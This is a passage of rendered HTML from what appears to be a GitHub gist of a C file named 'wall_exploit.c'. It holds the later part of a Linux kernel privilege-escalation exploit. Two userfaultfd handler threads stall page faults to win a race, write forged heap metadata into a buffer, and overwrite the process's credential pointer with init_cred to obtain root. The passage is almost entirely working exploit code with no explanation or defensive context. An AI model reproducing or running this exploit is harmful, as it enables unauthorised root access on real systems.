          <td id="file-wall_exploit-c-LC293" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>can't setup threads for race<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L294" class="blob-num js-line-number js-code-nav-line-number" data-line-number="294"></td>
          <td id="file-wall_exploit-c-LC294" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L295" class="blob-num js-line-number js-code-nav-line-number" data-line-number="295"></td>
          <td id="file-wall_exploit-c-LC295" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">while</span> (marker != <span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L296" class="blob-num js-line-number js-code-nav-line-number" data-line-number="296"></td>
          <td id="file-wall_exploit-c-LC296" class="blob-code blob-code-inner js-file-line">        </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L297" class="blob-num js-line-number js-code-nav-line-number" data-line-number="297"></td>
          <td id="file-wall_exploit-c-LC297" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>(uf_buffer, <span class="pl-c1">0x55</span>, <span class="pl-k">sizeof</span>(uf_buffer));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L298" class="blob-num js-line-number js-code-nav-line-number" data-line-number="298"></td>
          <td id="file-wall_exploit-c-LC298" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)uf_buffer + <span class="pl-c1">0x8</span> + <span class="pl-c1">0x18</span>, (<span class="pl-k">void</span> *)&amp;target_addr, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L299" class="blob-num js-line-number js-code-nav-line-number" data-line-number="299"></td>
          <td id="file-wall_exploit-c-LC299" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">uint64_t</span> evil_size = <span class="pl-c1">0xfe0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L300" class="blob-num js-line-number js-code-nav-line-number" data-line-number="300"></td>
          <td id="file-wall_exploit-c-LC300" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)uf_buffer + <span class="pl-c1">0x8</span> + <span class="pl-c1">0x10</span>, (<span class="pl-k">void</span> *)&amp;evil_size, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L301" class="blob-num js-line-number js-code-nav-line-number" data-line-number="301"></td>
          <td id="file-wall_exploit-c-LC301" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">uint64_t</span> evil_type = <span class="pl-c1">10</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L302" class="blob-num js-line-number js-code-nav-line-number" data-line-number="302"></td>
          <td id="file-wall_exploit-c-LC302" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)uf_buffer + <span class="pl-c1">0x8</span> + <span class="pl-c1">0x8</span>, (<span class="pl-k">void</span> *)&amp;evil_type, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L303" class="blob-num js-line-number js-code-nav-line-number" data-line-number="303"></td>
          <td id="file-wall_exploit-c-LC303" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)uf_buffer + <span class="pl-c1">0x8</span>, <span class="pl-c1">0</span>, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L304" class="blob-num js-line-number js-code-nav-line-number" data-line-number="304"></td>
          <td id="file-wall_exploit-c-LC304" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span> we must be careful to hang the second one till the first one is done</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L305" class="blob-num js-line-number js-code-nav-line-number" data-line-number="305"></td>
          <td id="file-wall_exploit-c-LC305" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span> otherwrise the first one will try to deref a next pointer (second one's linked list pointers) and fall into bad ptr chain</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L306" class="blob-num js-line-number js-code-nav-line-number" data-line-number="306"></td>
          <td id="file-wall_exploit-c-LC306" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L307" class="blob-num js-line-number js-code-nav-line-number" data-line-number="307"></td>
          <td id="file-wall_exploit-c-LC307" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L308" class="blob-num js-line-number js-code-nav-line-number" data-line-number="308"></td>
          <td id="file-wall_exploit-c-LC308" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(<span class="pl-c1">ioctl</span>(uffd, UFFDIO_COPY, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_copy) == -<span class="pl-c1">1</span>) <span class="pl-c"><span class="pl-c">//</span> wake it up</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L309" class="blob-num js-line-number js-code-nav-line-number" data-line-number="309"></td>
          <td id="file-wall_exploit-c-LC309" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L310" class="blob-num js-line-number js-code-nav-line-number" data-line-number="310"></td>
          <td id="file-wall_exploit-c-LC310" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>uffdio_copy error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L311" class="blob-num js-line-number js-code-nav-line-number" data-line-number="311"></td>
          <td id="file-wall_exploit-c-LC311" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L312" class="blob-num js-line-number js-code-nav-line-number" data-line-number="312"></td>
          <td id="file-wall_exploit-c-LC312" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L313" class="blob-num js-line-number js-code-nav-line-number" data-line-number="313"></td>
          <td id="file-wall_exploit-c-LC313" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">ioctl</span>(uffd, UFFDIO_UNREGISTER, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_range) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L314" class="blob-num js-line-number js-code-nav-line-number" data-line-number="314"></td>
          <td id="file-wall_exploit-c-LC314" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L315" class="blob-num js-line-number js-code-nav-line-number" data-line-number="315"></td>
          <td id="file-wall_exploit-c-LC315" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error unregistering page for userfaultfd<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L316" class="blob-num js-line-number js-code-nav-line-number" data-line-number="316"></td>
          <td id="file-wall_exploit-c-LC316" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L317" class="blob-num js-line-number js-code-nav-line-number" data-line-number="317"></td>
          <td id="file-wall_exploit-c-LC317" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">munmap</span>((<span class="pl-k">void</span> *)race_page1, <span class="pl-c1">0x1000</span>) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L318" class="blob-num js-line-number js-code-nav-line-number" data-line-number="318"></td>
          <td id="file-wall_exploit-c-LC318" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L319" class="blob-num js-line-number js-code-nav-line-number" data-line-number="319"></td>
          <td id="file-wall_exploit-c-LC319" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error on munmapping race page<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L320" class="blob-num js-line-number js-code-nav-line-number" data-line-number="320"></td>
          <td id="file-wall_exploit-c-LC320" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L321" class="blob-num js-line-number js-code-nav-line-number" data-line-number="321"></td>
          <td id="file-wall_exploit-c-LC321" class="blob-code blob-code-inner js-file-line">        marker = <span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L322" class="blob-num js-line-number js-code-nav-line-number" data-line-number="322"></td>
          <td id="file-wall_exploit-c-LC322" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">pthread_join</span>(thread3, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L323" class="blob-num js-line-number js-code-nav-line-number" data-line-number="323"></td>
          <td id="file-wall_exploit-c-LC323" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L324" class="blob-num js-line-number js-code-nav-line-number" data-line-number="324"></td>
          <td id="file-wall_exploit-c-LC324" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L325" class="blob-num js-line-number js-code-nav-line-number" data-line-number="325"></td>
          <td id="file-wall_exploit-c-LC325" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L326" class="blob-num js-line-number js-code-nav-line-number" data-line-number="326"></td>
          <td id="file-wall_exploit-c-LC326" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L327" class="blob-num js-line-number js-code-nav-line-number" data-line-number="327"></td>
          <td id="file-wall_exploit-c-LC327" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L328" class="blob-num js-line-number js-code-nav-line-number" data-line-number="328"></td>
          <td id="file-wall_exploit-c-LC328" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">second_hang</span>(<span class="pl-k">void</span> *arg)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L329" class="blob-num js-line-number js-code-nav-line-number" data-line-number="329"></td>
          <td id="file-wall_exploit-c-LC329" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L330" class="blob-num js-line-number js-code-nav-line-number" data-line-number="330"></td>
          <td id="file-wall_exploit-c-LC330" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffd_msg uf_msg;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L331" class="blob-num js-line-number js-code-nav-line-number" data-line-number="331"></td>
          <td id="file-wall_exploit-c-LC331" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_copy uf_copy;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L332" class="blob-num js-line-number js-code-nav-line-number" data-line-number="332"></td>
          <td id="file-wall_exploit-c-LC332" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_range uf_range;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L333" class="blob-num js-line-number js-code-nav-line-number" data-line-number="333"></td>
          <td id="file-wall_exploit-c-LC333" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">long</span> uffd = (<span class="pl-k">long</span>)arg;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L334" class="blob-num js-line-number js-code-nav-line-number" data-line-number="334"></td>
          <td id="file-wall_exploit-c-LC334" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> pollfd pollfd;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L335" class="blob-num js-line-number js-code-nav-line-number" data-line-number="335"></td>
          <td id="file-wall_exploit-c-LC335" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> nready;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L336" class="blob-num js-line-number js-code-nav-line-number" data-line-number="336"></td>
          <td id="file-wall_exploit-c-LC336" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L337" class="blob-num js-line-number js-code-nav-line-number" data-line-number="337"></td>
          <td id="file-wall_exploit-c-LC337" class="blob-code blob-code-inner js-file-line">    pollfd.<span class="pl-smi">fd</span> = uffd;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L338" class="blob-num js-line-number js-code-nav-line-number" data-line-number="338"></td>
          <td id="file-wall_exploit-c-LC338" class="blob-code blob-code-inner js-file-line">    pollfd.<span class="pl-smi">events</span> = POLLIN;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L339" class="blob-num js-line-number js-code-nav-line-number" data-line-number="339"></td>
          <td id="file-wall_exploit-c-LC339" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L340" class="blob-num js-line-number js-code-nav-line-number" data-line-number="340"></td>
          <td id="file-wall_exploit-c-LC340" class="blob-code blob-code-inner js-file-line">    uf_range.<span class="pl-smi">start</span> = race_page2;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L341" class="blob-num js-line-number js-code-nav-line-number" data-line-number="341"></td>
          <td id="file-wall_exploit-c-LC341" class="blob-code blob-code-inner js-file-line">    uf_range.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L342" class="blob-num js-line-number js-code-nav-line-number" data-line-number="342"></td>
          <td id="file-wall_exploit-c-LC342" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L343" class="blob-num js-line-number js-code-nav-line-number" data-line-number="343"></td>
          <td id="file-wall_exploit-c-LC343" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span>(<span class="pl-c1">poll</span>(&amp;pollfd, <span class="pl-c1">1</span>, -<span class="pl-c1">1</span>) &gt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L344" class="blob-num js-line-number js-code-nav-line-number" data-line-number="344"></td>
          <td id="file-wall_exploit-c-LC344" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L345" class="blob-num js-line-number js-code-nav-line-number" data-line-number="345"></td>
          <td id="file-wall_exploit-c-LC345" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(pollfd.<span class="pl-smi">revents</span> &amp; POLLERR || pollfd.<span class="pl-smi">revents</span> &amp; POLLHUP)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L346" class="blob-num js-line-number js-code-nav-line-number" data-line-number="346"></td>
          <td id="file-wall_exploit-c-LC346" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L347" class="blob-num js-line-number js-code-nav-line-number" data-line-number="347"></td>
          <td id="file-wall_exploit-c-LC347" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>polling error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L348" class="blob-num js-line-number js-code-nav-line-number" data-line-number="348"></td>
          <td id="file-wall_exploit-c-LC348" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L349" class="blob-num js-line-number js-code-nav-line-number" data-line-number="349"></td>
          <td id="file-wall_exploit-c-LC349" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L350" class="blob-num js-line-number js-code-nav-line-number" data-line-number="350"></td>
          <td id="file-wall_exploit-c-LC350" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span> reading the event</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L351" class="blob-num js-line-number js-code-nav-line-number" data-line-number="351"></td>
          <td id="file-wall_exploit-c-LC351" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(<span class="pl-c1">read</span>(uffd, &amp;uf_msg, <span class="pl-k">sizeof</span>(uf_msg)) == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L352" class="blob-num js-line-number js-code-nav-line-number" data-line-number="352"></td>
          <td id="file-wall_exploit-c-LC352" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L353" class="blob-num js-line-number js-code-nav-line-number" data-line-number="353"></td>
          <td id="file-wall_exploit-c-LC353" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error reading event<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L354" class="blob-num js-line-number js-code-nav-line-number" data-line-number="354"></td>
          <td id="file-wall_exploit-c-LC354" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L355" class="blob-num js-line-number js-code-nav-line-number" data-line-number="355"></td>
          <td id="file-wall_exploit-c-LC355" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L356" class="blob-num js-line-number js-code-nav-line-number" data-line-number="356"></td>
          <td id="file-wall_exploit-c-LC356" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(uf_msg.<span class="pl-smi">event</span> != UFFD_EVENT_PAGEFAULT)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L357" class="blob-num js-line-number js-code-nav-line-number" data-line-number="357"></td>
          <td id="file-wall_exploit-c-LC357" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L358" class="blob-num js-line-number js-code-nav-line-number" data-line-number="358"></td>
          <td id="file-wall_exploit-c-LC358" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>unexpected result from event<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L359" class="blob-num js-line-number js-code-nav-line-number" data-line-number="359"></td>
          <td id="file-wall_exploit-c-LC359" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L360" class="blob-num js-line-number js-code-nav-line-number" data-line-number="360"></td>
          <td id="file-wall_exploit-c-LC360" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L361" class="blob-num js-line-number js-code-nav-line-number" data-line-number="361"></td>
          <td id="file-wall_exploit-c-LC361" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L362" class="blob-num js-line-number js-code-nav-line-number" data-line-number="362"></td>
          <td id="file-wall_exploit-c-LC362" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> uf_buffer[<span class="pl-c1">0x1000</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L363" class="blob-num js-line-number js-code-nav-line-number" data-line-number="363"></td>
          <td id="file-wall_exploit-c-LC363" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>caught pagefault on 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, race_page2);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L364" class="blob-num js-line-number js-code-nav-line-number" data-line-number="364"></td>
          <td id="file-wall_exploit-c-LC364" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L365" class="blob-num js-line-number js-code-nav-line-number" data-line-number="365"></td>
          <td id="file-wall_exploit-c-LC365" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">src</span> = (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)uf_buffer;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L366" class="blob-num js-line-number js-code-nav-line-number" data-line-number="366"></td>
          <td id="file-wall_exploit-c-LC366" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">dst</span> = race_page2;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L367" class="blob-num js-line-number js-code-nav-line-number" data-line-number="367"></td>
          <td id="file-wall_exploit-c-LC367" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L368" class="blob-num js-line-number js-code-nav-line-number" data-line-number="368"></td>
          <td id="file-wall_exploit-c-LC368" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">mode</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L369" class="blob-num js-line-number js-code-nav-line-number" data-line-number="369"></td>
          <td id="file-wall_exploit-c-LC369" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">copy</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L370" class="blob-num js-line-number js-code-nav-line-number" data-line-number="370"></td>
          <td id="file-wall_exploit-c-LC370" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L371" class="blob-num js-line-number js-code-nav-line-number" data-line-number="371"></td>
          <td id="file-wall_exploit-c-LC371" class="blob-code blob-code-inner js-file-line">        marker = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L372" class="blob-num js-line-number js-code-nav-line-number" data-line-number="372"></td>
          <td id="file-wall_exploit-c-LC372" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">while</span> (marker != <span class="pl-c1">2</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L373" class="blob-num js-line-number js-code-nav-line-number" data-line-number="373"></td>
          <td id="file-wall_exploit-c-LC373" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>overwriting current cred pointer with init_cred<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L374" class="blob-num js-line-number js-code-nav-line-number" data-line-number="374"></td>
          <td id="file-wall_exploit-c-LC374" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L375" class="blob-num js-line-number js-code-nav-line-number" data-line-number="375"></td>
          <td id="file-wall_exploit-c-LC375" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)uf_buffer + <span class="pl-c1">0xfd0</span>, (<span class="pl-k">void</span> *)&amp;init_cred, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L376" class="blob-num js-line-number js-code-nav-line-number" data-line-number="376"></td>
          <td id="file-wall_exploit-c-LC376" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)uf_buffer + <span class="pl-c1">0xfd8</span>, (<span class="pl-k">void</span> *)&amp;init_cred, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L377" class="blob-num js-line-number js-code-nav-line-number" data-line-number="377"></td>
          <td id="file-wall_exploit-c-LC377" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L378" class="blob-num js-line-number js-code-nav-line-number" data-line-number="378"></td>
          <td id="file-wall_exploit-c-LC378" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(<span class="pl-c1">ioctl</span>(uffd, UFFDIO_COPY, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_copy) == -<span class="pl-c1">1</span>) <span class="pl-c"><span class="pl-c">//</span> wake it up</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L379" class="blob-num js-line-number js-code-nav-line-number" data-line-number="379"></td>
          <td id="file-wall_exploit-c-LC379" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L380" class="blob-num js-line-number js-code-nav-line-number" data-line-number="380"></td>
          <td id="file-wall_exploit-c-LC380" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>uffdio_copy error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L381" class="blob-num js-line-number js-code-nav-line-number" data-line-number="381"></td>
          <td id="file-wall_exploit-c-LC381" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L382" class="blob-num js-line-number js-code-nav-line-number" data-line-number="382"></td>
          <td id="file-wall_exploit-c-LC382" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L383" class="blob-num js-line-number js-code-nav-line-number" data-line-number="383"></td>
          <td id="file-wall_exploit-c-LC383" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">ioctl</span>(uffd, UFFDIO_UNREGISTER, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_range) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L384" class="blob-num js-line-number js-code-nav-line-number" data-line-number="384"></td>
          <td id="file-wall_exploit-c-LC384" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L385" class="blob-num js-line-number js-code-nav-line-number" data-line-number="385"></td>
          <td id="file-wall_exploit-c-LC385" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error unregistering page for userfaultfd<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L386" class="blob-num js-line-number js-code-nav-line-number" data-line-number="386"></td>
          <td id="file-wall_exploit-c-LC386" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L387" class="blob-num js-line-number js-code-nav-line-number" data-line-number="387"></td>
          <td id="file-wall_exploit-c-LC387" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">munmap</span>((<span class="pl-k">void</span> *)race_page2, <span class="pl-c1">0x1000</span>) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L388" class="blob-num js-line-number js-code-nav-line-number" data-line-number="388"></td>
          <td id="file-wall_exploit-c-LC388" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L389" class="blob-num js-line-number js-code-nav-line-number" data-line-number="389"></td>
          <td id="file-wall_exploit-c-LC389" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error on munmapping race page<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L390" class="blob-num js-line-number js-code-nav-line-number" data-line-number="390"></td>
          <td id="file-wall_exploit-c-LC390" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L391" class="blob-num js-line-number js-code-nav-line-number" data-line-number="391"></td>
          <td id="file-wall_exploit-c-LC391" class="blob-code blob-code-inner js-file-line">        marker = <span class="pl-c1">3</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L392" class="blob-num js-line-number js-code-nav-line-number" data-line-number="392"></td>
          <td id="file-wall_exploit-c-LC392" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L393" class="blob-num js-line-number js-code-nav-line-number" data-line-number="393"></td>
          <td id="file-wall_exploit-c-LC393" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L394" class="blob-num js-line-number js-code-nav-line-number" data-line-number="394"></td>
          <td id="file-wall_exploit-c-LC394" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>; </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L395" class="blob-num js-line-number js-code-nav-line-number" data-line-number="395"></td>
          <td id="file-wall_exploit-c-LC395" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L396" class="blob-num js-line-number js-code-nav-line-number" data-line-number="396"></td>
          <td id="file-wall_exploit-c-LC396" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
